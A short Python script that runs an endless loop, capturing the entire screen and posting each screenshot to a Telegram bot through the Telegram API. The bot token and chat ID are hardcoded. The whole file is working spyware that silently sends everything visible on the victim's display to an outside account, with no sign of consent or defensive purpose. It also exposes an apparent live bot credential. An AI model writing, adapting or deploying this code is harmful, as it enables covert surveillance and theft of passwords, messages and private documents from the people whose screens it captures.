import requests
import PIL.ImageGrab
import io
import time
TGBOT_TOKEN   = '985536359:AAH16l6cvdEZDlfvt8IIROwEzpJPzvS3bm4'
TGBOT_CHAT_ID = '647843817'
def screenshot():
    im = PIL.ImageGrab.grab()
    fp = io.BytesIO()
    im.save(fp, 'JPEG')
    fp.seek(0)
    return fp


def tgbot_send_photo(photo):
    params = {'chat_id': TGBOT_CHAT_ID}
    files = {'photo': photo}
    requests.post(f'https://api.telegram.org/bot{TGBOT_TOKEN}/sendPhoto', params=params, files=files)

while True:
    tgbot_send_photo(screenshot())